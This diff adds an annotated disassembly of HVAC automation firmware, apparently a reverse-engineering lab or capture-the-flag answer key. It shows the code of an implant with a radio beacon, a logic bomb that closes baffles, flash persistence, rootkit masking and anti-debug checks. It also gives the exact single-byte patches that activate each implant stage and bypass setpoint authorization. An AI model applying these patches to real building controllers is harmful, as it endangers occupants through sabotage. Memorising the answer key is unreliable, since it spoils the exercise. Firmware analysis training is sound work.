@@ -1,0 +1,426 @@
+; =============================================================================
+; Disassembly of IRON LUNG HVAC automation firmware (artifact ACT-IV)
+; Binary: ACT-IV_fixed.bin loaded at flash base 0x10000000
+; Architecture: ARM Cortex-M33 (Thumb-2), RP2350, Pico SDK 2.2.0
+; Toolchain: arm-none-eabi-gcc 14.2.Rel1, -O3
+;
+; File offsets in this listing are VA - 0x10000000, matching the .bin.
+; Every defect is an in-place, same-size byte patch, so no address moves.
+;
+; -----------------------------------------------------------------------------
+; KEY FINDINGS - THE FOUR SABOTAGE SITES
+; -----------------------------------------------------------------------------
+;
+;   Defect 1 - Persistence re-install (implant_init, implant_resume inlined)
+;     VA 0x1000A46E  file 0xA46E
+;       d0fa  beq.n 0x1000A466   ; correct: re-install gate clear, no re-arm
+;     COMPROMISE: patch byte 0xA46F 0xD0 -> 0xD1 (beq -> bne)
+;     A present reserved-sector marker re-arms the logic bomb on every boot,
+;     so a firmware reflash alone does not remove the implant.
+;
+;   Defect 2 - Rootkit hiding (implant_rootkit_active)
+;     VA 0x1000A2D0  file 0xA2D0
+;       b123  cbz r3, 0x1000A2DC ; correct: rootkit gate clear, no masking
+;     COMPROMISE: patch byte 0xA2D1 0xB1 -> 0xB9 (cbz -> cbnz)
+;     The beacon status is masked from B:UP to B:-- on the LCD and the BCN
+;     maintenance log is suppressed while the beacon still transmits.
+;
+;   Defect 3 - Reserved-sector write (implant_init, implant_persist inlined)
+;     VA 0x1000A42C  file 0xA42C
+;       b1db  cbz r3, 0x1000A466 ; correct: persist gate clear, no write
+;     COMPROMISE: patch byte 0xA42D 0xB1 -> 0xB9 (cbz -> cbnz)
+;     The persist gate is inverted, so the first boot writes marker 0xC7 to
+;     0x103FF000. The detonation-path copy in implant_tick stays gated.
+;
+;   Defect 4 - SETPOINT authorization (control_handle_frame)
+;     VA 0x10007580  file 0x7580
+;       d0e1  beq.n 0x10007546   ; correct: authorization failed, reject
+;     COMPROMISE: patch byte 0x7581 0xD0 -> 0xD1 (beq -> bne)
+;     The authorization verdict is inverted, so an unauthenticated or replayed
+;     SETPOINT envelope reaches the applied setpoint.
+;
+; The CoreDebug DHCSR anti-debug check is identical in both images and is an
+; analysis obstacle, not a patch.
+;
+; Total intended changed bytes: 4. ACT-IV.bin and ACT-IV_fixed.bin differ in
+; exactly those four bytes and nothing else.
+;
+; =============================================================================
+
+
+; -----------------------------------------------------------------------------
+; main (boot path)
+; -----------------------------------------------------------------------------
+10000234 <main>:
+10000234:	b508      	push	{r3, lr}
+10000236:	f003 fa93 	bl	10003760 <stdio_init_all>
+1000023a:	4807      	ldr	r0, [pc, #28]	@ (10000258 <main+0x24>)
+1000023c:	f003 fada 	bl	100037f4 <__wrap_puts>
+10000240:	f006 f8fa 	bl	10006438 <monitor_init>
+10000244:	b110      	cbz	r0, 1000024c <main+0x18>
+10000246:	f006 f9cb 	bl	100065e0 <monitor_step>
+1000024a:	e7fc      	b.n	10000246 <main+0x12>
+1000024c:	4803      	ldr	r0, [pc, #12]	@ (1000025c <main+0x28>)
+1000024e:	f003 fad1 	bl	100037f4 <__wrap_puts>
+10000252:	2001      	movs	r0, #1
+10000254:	bd08      	pop	{r3, pc}
+10000256:	bf00      	nop
+10000258:	1000abd8 	.word	0x1000abd8
+1000025c:	1000abe0 	.word	0x1000abe0
+
+
+
+; -----------------------------------------------------------------------------
+; control_handle_frame (sealed SETPOINT path)
+; -----------------------------------------------------------------------------
+1000750c <control_handle_frame>:
+1000750c:	2107      	movs	r1, #7
+1000750e:	b510      	push	{r4, lr}
+10007510:	4b1e      	ldr	r3, [pc, #120]	@ (1000758c <control_handle_frame+0x80>)
+10007512:	b096      	sub	sp, #88	@ 0x58
+10007514:	781a      	ldrb	r2, [r3, #0]
+10007516:	f88d 1018 	strb.w	r1, [sp, #24]
+1000751a:	b1a2      	cbz	r2, 10007546 <control_handle_frame+0x3a>
+1000751c:	b198      	cbz	r0, 10007546 <control_handle_frame+0x3a>
+1000751e:	2430      	movs	r4, #48	@ 0x30
+10007520:	a905      	add	r1, sp, #20
+10007522:	aa0a      	add	r2, sp, #40	@ 0x28
+10007524:	4603      	mov	r3, r0
+10007526:	9102      	str	r1, [sp, #8]
+10007528:	9200      	str	r2, [sp, #0]
+1000752a:	4819      	ldr	r0, [pc, #100]	@ (10007590 <control_handle_frame+0x84>)
+1000752c:	2201      	movs	r2, #1
+1000752e:	a906      	add	r1, sp, #24
+10007530:	9401      	str	r4, [sp, #4]
+10007532:	f000 fa15 	bl	10007960 <envelope_open_hex>
+10007536:	b130      	cbz	r0, 10007546 <control_handle_frame+0x3a>
+10007538:	9b05      	ldr	r3, [sp, #20]
+1000753a:	2b16      	cmp	r3, #22
+1000753c:	d903      	bls.n	10007546 <control_handle_frame+0x3a>
+1000753e:	f89d 302c 	ldrb.w	r3, [sp, #44]	@ 0x2c
+10007542:	2b01      	cmp	r3, #1
+10007544:	d002      	beq.n	1000754c <control_handle_frame+0x40>
+10007546:	2000      	movs	r0, #0
+10007548:	b016      	add	sp, #88	@ 0x58
+1000754a:	bd10      	pop	{r4, pc}
+1000754c:	f8bd 402d 	ldrh.w	r4, [sp, #45]	@ 0x2d
+10007550:	f1a4 0332 	sub.w	r3, r4, #50	@ 0x32
+10007554:	f5b3 7f96 	cmp.w	r3, #300	@ 0x12c
+10007558:	b224      	sxth	r4, r4
+1000755a:	d8f4      	bhi.n	10007546 <control_handle_frame+0x3a>
+1000755c:	f8dd 002f 	ldr.w	r0, [sp, #47]	@ 0x2f
+10007560:	f8dd 1033 	ldr.w	r1, [sp, #51]	@ 0x33
+10007564:	f8dd 2037 	ldr.w	r2, [sp, #55]	@ 0x37
+10007568:	f8dd 303b 	ldr.w	r3, [sp, #59]	@ 0x3b
+1000756c:	f10d 0c18 	add.w	ip, sp, #24
+10007570:	e8ac 000f 	stmia.w	ip!, {r0, r1, r2, r3}
+10007574:	990a      	ldr	r1, [sp, #40]	@ 0x28
+10007576:	4807      	ldr	r0, [pc, #28]	@ (10007594 <control_handle_frame+0x88>)
+10007578:	aa06      	add	r2, sp, #24
+1000757a:	f000 f89d 	bl	100076b8 <hvac_auth_apply>
+1000757e:	2800      	cmp	r0, #0
+10007580:	d0e1      	beq.n	10007546 <control_handle_frame+0x3a>
+    ; DEFECT 4 SETPOINT AUTH: beq rejects when authorization fails. ACT-IV.bin flips 0x7581 0xD0 -> 0xD1 (bne).
+10007582:	4b05      	ldr	r3, [pc, #20]	@ (10007598 <control_handle_frame+0x8c>)
+10007584:	801c      	strh	r4, [r3, #0]
+10007586:	b016      	add	sp, #88	@ 0x58
+10007588:	bd10      	pop	{r4, pc}
+1000758a:	bf00      	nop
+1000758c:	20013cf3 	.word	0x20013cf3
+10007590:	200136c8 	.word	0x200136c8
+10007594:	200136ac 	.word	0x200136ac
+10007598:	20013ce6 	.word	0x20013ce6
+
+
+
+; -----------------------------------------------------------------------------
+; hvac_auth_apply (anti-replay and state tag)
+; -----------------------------------------------------------------------------
+100076b8 <hvac_auth_apply>:
+100076b8:	2800      	cmp	r0, #0
+100076ba:	d05c      	beq.n	10007776 <hvac_auth_apply+0xbe>
+100076bc:	e92d 41f0 	stmdb	sp!, {r4, r5, r6, r7, r8, lr}
+100076c0:	4616      	mov	r6, r2
+100076c2:	b094      	sub	sp, #80	@ 0x50
+100076c4:	b122      	cbz	r2, 100076d0 <hvac_auth_apply+0x18>
+100076c6:	6883      	ldr	r3, [r0, #8]
+100076c8:	4604      	mov	r4, r0
+100076ca:	428b      	cmp	r3, r1
+100076cc:	460d      	mov	r5, r1
+100076ce:	d303      	bcc.n	100076d8 <hvac_auth_apply+0x20>
+100076d0:	2000      	movs	r0, #0
+100076d2:	b014      	add	sp, #80	@ 0x50
+100076d4:	e8bd 81f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, pc}
+100076d8:	4b28      	ldr	r3, [pc, #160]	@ (1000777c <hvac_auth_apply+0xc4>)
+100076da:	781b      	ldrb	r3, [r3, #0]
+100076dc:	2b00      	cmp	r3, #0
+100076de:	d0f7      	beq.n	100076d0 <hvac_auth_apply+0x18>
+100076e0:	b2cb      	uxtb	r3, r1
+100076e2:	f88d 3011 	strb.w	r3, [sp, #17]
+100076e6:	f88d 3015 	strb.w	r3, [sp, #21]
+100076ea:	2300      	movs	r3, #0
+100076ec:	22a7      	movs	r2, #167	@ 0xa7
+100076ee:	2701      	movs	r7, #1
+100076f0:	f8cd 3049 	str.w	r3, [sp, #73]	@ 0x49
+100076f4:	9301      	str	r3, [sp, #4]
+100076f6:	f8cd 303d 	str.w	r3, [sp, #61]	@ 0x3d
+100076fa:	f8cd 3041 	str.w	r3, [sp, #65]	@ 0x41
+100076fe:	f8cd 3045 	str.w	r3, [sp, #69]	@ 0x45
+10007702:	9313      	str	r3, [sp, #76]	@ 0x4c
+10007704:	ab07      	add	r3, sp, #28
+10007706:	9302      	str	r3, [sp, #8]
+10007708:	f3c1 2307 	ubfx	r3, r1, #8, #8
+1000770c:	f88d 3012 	strb.w	r3, [sp, #18]
+10007710:	f88d 3016 	strb.w	r3, [sp, #22]
+10007714:	f3c1 4307 	ubfx	r3, r1, #16, #8
+10007718:	f88d 203c 	strb.w	r2, [sp, #60]	@ 0x3c
+1000771c:	f10d 0828 	add.w	r8, sp, #40	@ 0x28
+10007720:	aa04      	add	r2, sp, #16
+10007722:	f88d 3013 	strb.w	r3, [sp, #19]
+10007726:	f88d 3017 	strb.w	r3, [sp, #23]
+1000772a:	0e0b      	lsrs	r3, r1, #24
+1000772c:	910e      	str	r1, [sp, #56]	@ 0x38
+1000772e:	f88d 3014 	strb.w	r3, [sp, #20]
+10007732:	f88d 3018 	strb.w	r3, [sp, #24]
+10007736:	4812      	ldr	r0, [pc, #72]	@ (10007780 <hvac_auth_apply+0xc8>)
+10007738:	2309      	movs	r3, #9
+1000773a:	9200      	str	r2, [sp, #0]
+1000773c:	f8cd 800c 	str.w	r8, [sp, #12]
+10007740:	a90e      	add	r1, sp, #56	@ 0x38
+10007742:	f88d 7010 	strb.w	r7, [sp, #16]
+10007746:	f000 f843 	bl	100077d0 <crypto_aead_seal>
+1000774a:	2800      	cmp	r0, #0
+1000774c:	d0c0      	beq.n	100076d0 <hvac_auth_apply+0x18>
+1000774e:	4640      	mov	r0, r8
+10007750:	4631      	mov	r1, r6
+10007752:	f000 f817 	bl	10007784 <crypto_aead_tag_equal>
+10007756:	2800      	cmp	r0, #0
+10007758:	d0ba      	beq.n	100076d0 <hvac_auth_apply+0x18>
+1000775a:	e9c4 5501 	strd	r5, r5, [r4, #4]
+1000775e:	7027      	strb	r7, [r4, #0]
+10007760:	6835      	ldr	r5, [r6, #0]
+10007762:	6871      	ldr	r1, [r6, #4]
+10007764:	68b2      	ldr	r2, [r6, #8]
+10007766:	68f3      	ldr	r3, [r6, #12]
+10007768:	60e5      	str	r5, [r4, #12]
+1000776a:	6121      	str	r1, [r4, #16]
+1000776c:	6162      	str	r2, [r4, #20]
+1000776e:	61a3      	str	r3, [r4, #24]
+10007770:	b014      	add	sp, #80	@ 0x50
+10007772:	e8bd 81f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, pc}
+10007776:	2000      	movs	r0, #0
+10007778:	4770      	bx	lr
+1000777a:	bf00      	nop
+1000777c:	20013cf5 	.word	0x20013cf5
+10007780:	200136ec 	.word	0x200136ec
+
+
+
+; -----------------------------------------------------------------------------
+; implant_rootkit_active (rootkit masking)
+; -----------------------------------------------------------------------------
+1000a2c8 <implant_rootkit_active>:
+1000a2c8:	4b0a      	ldr	r3, [pc, #40]	@ (1000a2f4 <implant_rootkit_active+0x2c>)
+1000a2ca:	781b      	ldrb	r3, [r3, #0]
+1000a2cc:	f003 00ff 	and.w	r0, r3, #255	@ 0xff
+1000a2d0:	b123      	cbz	r3, 1000a2dc <implant_rootkit_active+0x14>
+    ; DEFECT 2 ROOTKIT: cbz skips masking while the gate is clear. ACT-IV.bin flips 0xA2D1 0xB1 -> 0xB9 (cbnz).
+1000a2d2:	4b09      	ldr	r3, [pc, #36]	@ (1000a2f8 <implant_rootkit_active+0x30>)
+1000a2d4:	781b      	ldrb	r3, [r3, #0]
+1000a2d6:	2bc7      	cmp	r3, #199	@ 0xc7
+1000a2d8:	d001      	beq.n	1000a2de <implant_rootkit_active+0x16>
+1000a2da:	2000      	movs	r0, #0
+1000a2dc:	4770      	bx	lr
+1000a2de:	f04f 23e0 	mov.w	r3, #3758153728	@ 0xe000e000
+1000a2e2:	f8d3 0df0 	ldr.w	r0, [r3, #3568]	@ 0xdf0
+1000a2e6:	f000 0003 	and.w	r0, r0, #3
+1000a2ea:	fab0 f080 	clz	r0, r0
+1000a2ee:	0940      	lsrs	r0, r0, #5
+1000a2f0:	4770      	bx	lr
+1000a2f2:	bf00      	nop
+1000a2f4:	20013cfa 	.word	0x20013cfa
+1000a2f8:	103ff000 	.word	0x103ff000
+
+
+
+; -----------------------------------------------------------------------------
+; implant_tick (beacon and logic bomb)
+; -----------------------------------------------------------------------------
+1000a2fc <implant_tick>:
+1000a2fc:	f04f 2ce0 	mov.w	ip, #3758153728	@ 0xe000e000
+1000a300:	b530      	push	{r4, r5, lr}
+1000a302:	4c2a      	ldr	r4, [pc, #168]	@ (1000a3ac <implant_tick+0xb0>)
+1000a304:	b0c1      	sub	sp, #260	@ 0x104
+1000a306:	6823      	ldr	r3, [r4, #0]
+1000a308:	3301      	adds	r3, #1
+1000a30a:	6023      	str	r3, [r4, #0]
+1000a30c:	f8dc 2df0 	ldr.w	r2, [ip, #3568]	@ 0xdf0
+1000a310:	0791      	lsls	r1, r2, #30
+1000a312:	d109      	bne.n	1000a328 <implant_tick+0x2c>
+1000a314:	075a      	lsls	r2, r3, #29
+1000a316:	d009      	beq.n	1000a32c <implant_tick+0x30>
+1000a318:	4d25      	ldr	r5, [pc, #148]	@ (1000a3b0 <implant_tick+0xb4>)
+1000a31a:	782b      	ldrb	r3, [r5, #0]
+1000a31c:	b123      	cbz	r3, 1000a328 <implant_tick+0x2c>
+1000a31e:	4b25      	ldr	r3, [pc, #148]	@ (1000a3b4 <implant_tick+0xb8>)
+1000a320:	6822      	ldr	r2, [r4, #0]
+1000a322:	681b      	ldr	r3, [r3, #0]
+1000a324:	429a      	cmp	r2, r3
+1000a326:	d21a      	bcs.n	1000a35e <implant_tick+0x62>
+1000a328:	b041      	add	sp, #260	@ 0x104
+1000a32a:	bd30      	pop	{r4, r5, pc}
+1000a32c:	25c7      	movs	r5, #199	@ 0xc7
+1000a32e:	4a22      	ldr	r2, [pc, #136]	@ (1000a3b8 <implant_tick+0xbc>)
+1000a330:	f88d 5006 	strb.w	r5, [sp, #6]
+1000a334:	9200      	str	r2, [sp, #0]
+1000a336:	f8ad 3004 	strh.w	r3, [sp, #4]
+1000a33a:	f8dc 3df0 	ldr.w	r3, [ip, #3568]	@ 0xdf0
+1000a33e:	4d1c      	ldr	r5, [pc, #112]	@ (1000a3b0 <implant_tick+0xb4>)
+1000a340:	f013 0303 	ands.w	r3, r3, #3
+1000a344:	bf18      	it	ne
+1000a346:	2301      	movne	r3, #1
+1000a348:	4669      	mov	r1, sp
+1000a34a:	2208      	movs	r2, #8
+1000a34c:	481b      	ldr	r0, [pc, #108]	@ (1000a3bc <implant_tick+0xc0>)
+1000a34e:	f88d 3007 	strb.w	r3, [sp, #7]
+1000a352:	f000 f8ef 	bl	1000a534 <radio_send_frame>
+1000a356:	782b      	ldrb	r3, [r5, #0]
+1000a358:	2b00      	cmp	r3, #0
+1000a35a:	d0e5      	beq.n	1000a328 <implant_tick+0x2c>
+1000a35c:	e7df      	b.n	1000a31e <implant_tick+0x22>
+1000a35e:	f000 fa6d 	bl	1000a83c <baffle_close>
+1000a362:	2200      	movs	r2, #0
+1000a364:	4b16      	ldr	r3, [pc, #88]	@ (1000a3c0 <implant_tick+0xc4>)
+1000a366:	702a      	strb	r2, [r5, #0]
+1000a368:	781b      	ldrb	r3, [r3, #0]
+1000a36a:	2b00      	cmp	r3, #0
+1000a36c:	d0dc      	beq.n	1000a328 <implant_tick+0x2c>
+1000a36e:	4b15      	ldr	r3, [pc, #84]	@ (1000a3c4 <implant_tick+0xc8>)
+1000a370:	781b      	ldrb	r3, [r3, #0]
+1000a372:	2bc7      	cmp	r3, #199	@ 0xc7
+1000a374:	d0d8      	beq.n	1000a328 <implant_tick+0x2c>
+1000a376:	f3ef 8410 	mrs	r4, PRIMASK
+1000a37a:	b672      	cpsid	i
+1000a37c:	22ff      	movs	r2, #255	@ 0xff
+1000a37e:	f10d 0001 	add.w	r0, sp, #1
+1000a382:	4611      	mov	r1, r2
+1000a384:	f000 faa6 	bl	1000a8d4 <memset>
+1000a388:	23c7      	movs	r3, #199	@ 0xc7
+1000a38a:	f44f 5180 	mov.w	r1, #4096	@ 0x1000
+1000a38e:	480e      	ldr	r0, [pc, #56]	@ (1000a3c8 <implant_tick+0xcc>)
+1000a390:	f88d 3000 	strb.w	r3, [sp]
+1000a394:	f000 fbec 	bl	1000ab70 <__flash_range_erase_veneer>
+1000a398:	f44f 7280 	mov.w	r2, #256	@ 0x100
+1000a39c:	4669      	mov	r1, sp
+1000a39e:	480a      	ldr	r0, [pc, #40]	@ (1000a3c8 <implant_tick+0xcc>)
+1000a3a0:	f000 fbca 	bl	1000ab38 <__flash_range_program_veneer>
+1000a3a4:	f384 8810 	msr	PRIMASK, r4
+1000a3a8:	e7be      	b.n	1000a328 <implant_tick+0x2c>
+1000a3aa:	bf00      	nop
+1000a3ac:	20013710 	.word	0x20013710
+1000a3b0:	20013cf7 	.word	0x20013cf7
+1000a3b4:	20013714 	.word	0x20013714
+1000a3b8:	efbeadde 	.word	0xefbeadde
+1000a3bc:	40078000 	.word	0x40078000
+1000a3c0:	20013cf8 	.word	0x20013cf8
+1000a3c4:	103ff000 	.word	0x103ff000
+1000a3c8:	003ff000 	.word	0x003ff000
+
+
+
+; -----------------------------------------------------------------------------
+; implant_handle_command (FROSTLNE arming)
+; -----------------------------------------------------------------------------
+1000a3cc <implant_handle_command>:
+1000a3cc:	b180      	cbz	r0, 1000a3f0 <implant_handle_command+0x24>
+1000a3ce:	2907      	cmp	r1, #7
+1000a3d0:	d90e      	bls.n	1000a3f0 <implant_handle_command+0x24>
+1000a3d2:	b508      	push	{r3, lr}
+1000a3d4:	2208      	movs	r2, #8
+1000a3d6:	4907      	ldr	r1, [pc, #28]	@ (1000a3f4 <implant_handle_command+0x28>)
+1000a3d8:	f000 fa4e 	bl	1000a878 <memcmp>
+1000a3dc:	b938      	cbnz	r0, 1000a3ee <implant_handle_command+0x22>
+1000a3de:	2101      	movs	r1, #1
+1000a3e0:	4b05      	ldr	r3, [pc, #20]	@ (1000a3f8 <implant_handle_command+0x2c>)
+1000a3e2:	4a06      	ldr	r2, [pc, #24]	@ (1000a3fc <implant_handle_command+0x30>)
+1000a3e4:	681b      	ldr	r3, [r3, #0]
+1000a3e6:	4806      	ldr	r0, [pc, #24]	@ (1000a400 <implant_handle_command+0x34>)
+1000a3e8:	3303      	adds	r3, #3
+1000a3ea:	6003      	str	r3, [r0, #0]
+1000a3ec:	7011      	strb	r1, [r2, #0]
+1000a3ee:	bd08      	pop	{r3, pc}
+1000a3f0:	4770      	bx	lr
+1000a3f2:	bf00      	nop
+1000a3f4:	1000b328 	.word	0x1000b328
+1000a3f8:	20013710 	.word	0x20013710
+1000a3fc:	20013cf7 	.word	0x20013cf7
+1000a400:	20013714 	.word	0x20013714
+
+
+
+; -----------------------------------------------------------------------------
+; implant_init (boot persistence, implant_resume inlined)
+; -----------------------------------------------------------------------------
+1000a404 <implant_init>:
+1000a404:	2300      	movs	r3, #0
+1000a406:	b5f0      	push	{r4, r5, r6, r7, lr}
+1000a408:	4a1c      	ldr	r2, [pc, #112]	@ (1000a47c <implant_init+0x78>)
+1000a40a:	4e1d      	ldr	r6, [pc, #116]	@ (1000a480 <implant_init+0x7c>)
+1000a40c:	4d1d      	ldr	r5, [pc, #116]	@ (1000a484 <implant_init+0x80>)
+1000a40e:	4c1e      	ldr	r4, [pc, #120]	@ (1000a488 <implant_init+0x84>)
+1000a410:	4f1e      	ldr	r7, [pc, #120]	@ (1000a48c <implant_init+0x88>)
+1000a412:	491f      	ldr	r1, [pc, #124]	@ (1000a490 <implant_init+0x8c>)
+1000a414:	481f      	ldr	r0, [pc, #124]	@ (1000a494 <implant_init+0x90>)
+1000a416:	b0c1      	sub	sp, #260	@ 0x104
+1000a418:	7013      	strb	r3, [r2, #0]
+1000a41a:	6033      	str	r3, [r6, #0]
+1000a41c:	703b      	strb	r3, [r7, #0]
+1000a41e:	702b      	strb	r3, [r5, #0]
+1000a420:	6023      	str	r3, [r4, #0]
+1000a422:	700b      	strb	r3, [r1, #0]
+1000a424:	7803      	ldrb	r3, [r0, #0]
+1000a426:	2bc7      	cmp	r3, #199	@ 0xc7
+1000a428:	d01f      	beq.n	1000a46a <implant_init+0x66>
+1000a42a:	780b      	ldrb	r3, [r1, #0]
+1000a42c:	b1db      	cbz	r3, 1000a466 <implant_init+0x62>
+    ; DEFECT 3 PERSIST: cbz skips the marker while the gate is clear. ACT-IV.bin flips 0xA42D 0xB1 -> 0xB9 (cbnz).
+1000a42e:	7803      	ldrb	r3, [r0, #0]
+1000a430:	2bc7      	cmp	r3, #199	@ 0xc7
+1000a432:	d018      	beq.n	1000a466 <implant_init+0x62>
+1000a434:	f3ef 8410 	mrs	r4, PRIMASK
+1000a438:	b672      	cpsid	i
+1000a43a:	22ff      	movs	r2, #255	@ 0xff
+1000a43c:	f10d 0001 	add.w	r0, sp, #1
+1000a440:	4611      	mov	r1, r2
+1000a442:	f000 fa47 	bl	1000a8d4 <memset>
+1000a446:	23c7      	movs	r3, #199	@ 0xc7
+1000a448:	f44f 5180 	mov.w	r1, #4096	@ 0x1000
+1000a44c:	4812      	ldr	r0, [pc, #72]	@ (1000a498 <implant_init+0x94>)
+1000a44e:	f88d 3000 	strb.w	r3, [sp]
+1000a452:	f000 fb8d 	bl	1000ab70 <__flash_range_erase_veneer>
+1000a456:	f44f 7280 	mov.w	r2, #256	@ 0x100
+1000a45a:	4669      	mov	r1, sp
+1000a45c:	480e      	ldr	r0, [pc, #56]	@ (1000a498 <implant_init+0x94>)
+1000a45e:	f000 fb6b 	bl	1000ab38 <__flash_range_program_veneer>
+1000a462:	f384 8810 	msr	PRIMASK, r4
+1000a466:	b041      	add	sp, #260	@ 0x104
+1000a468:	bdf0      	pop	{r4, r5, r6, r7, pc}
+1000a46a:	7813      	ldrb	r3, [r2, #0]
+1000a46c:	2b00      	cmp	r3, #0
+1000a46e:	d0fa      	beq.n	1000a466 <implant_init+0x62>
+    ; DEFECT 1 RE-INSTALL: beq skips the re-arm while the gate is clear. ACT-IV.bin flips 0xA46F 0xD0 -> 0xD1 (bne).
+1000a470:	2201      	movs	r2, #1
+1000a472:	2303      	movs	r3, #3
+1000a474:	702a      	strb	r2, [r5, #0]
+1000a476:	6023      	str	r3, [r4, #0]
+1000a478:	b041      	add	sp, #260	@ 0x104
+1000a47a:	bdf0      	pop	{r4, r5, r6, r7, pc}
+1000a47c:	20013cf9 	.word	0x20013cf9
+1000a480:	20013710 	.word	0x20013710
+1000a484:	20013cf7 	.word	0x20013cf7
+1000a488:	20013714 	.word	0x20013714
+1000a48c:	20013cfa 	.word	0x20013cfa
+1000a490:	20013cf8 	.word	0x20013cf8
+1000a494:	103ff000 	.word	0x103ff000
+1000a498:	003ff000 	.word	0x003ff000
+
